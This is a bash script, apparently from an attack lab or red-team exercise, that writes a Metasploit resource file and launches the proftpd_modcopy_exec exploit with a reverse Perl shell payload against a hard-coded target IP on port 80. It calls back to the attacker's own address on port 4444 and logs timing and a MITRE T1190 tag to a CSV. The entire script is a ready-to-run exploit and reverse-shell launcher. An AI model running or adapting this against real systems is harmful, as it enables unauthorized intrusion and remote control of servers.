#!/bin/bash

CSV_FILE="/home/kali/attack.csv"

TIMESTAMP=$(date +"%m/%d/%Y %H:%M:%S")
TACTIC_ID="T1190"
export SOURCE_IP=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
export SOURCE_PORT="4444"
export TARGET_IP="143.88.2.21"
export TARGET_PORT="80"
GROUP_NUMBER=$(echo $SOURCE_IP | cut -d. -f3)
START_TIME_DATE=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
START_YEAR=$(date +"%Y")
START_MONTH=$(date +"%m")
START_DAY=$(date +"%d")
START_TIME=$(date +"%H:%M:%S")

export EXPLOIT="exploit/unix/ftp/proftpd_modcopy_exec"
export PAYLOAD="cmd/unix/reverse_perl"

echo "use $EXPLOIT" >> exploit_script.rc
echo "set PAYLOAD $PAYLOAD" >> exploit_script.rc
echo "set RHOST $TARGET_IP" >> exploit_script.rc
echo "set RPORT $TARGET_PORT" >> exploit_script.rc
echo "set LHOST $SOURCE_IP" >> exploit_script.rc
echo "set LPORT $SOURCE_PORT" >> exploit_script.rc
echo "set SITEPATH /var/www/html" >> exploit_script.rc
echo "show options" >> exploit_script.rc
echo "exploit -j" >> exploit_script.rc

msfconsole -r /home/kali/exploit_script.rc

echo -n > exploit_script.rc

END_YEAR=$(date +"%Y")
END_MONTH=$(date +"%m")
END_DAY=$(date +"%d")
END_TIME=$(date +"%H:%M:%S")

echo "$TIMESTAMP,$GROUP_NUMBER,$TACTIC_ID,$SOURCE_IP,$SOURCE_PORT,$TARGET_IP,$TARGET_PORT,$START_TIME_DATE,$START_YEAR,$START_MONTH,$START_DAY,$START_TIME,$END_YEAR,$END_MONTH,$END_DAY,$END_TIME" >> "$CSV_FILE"

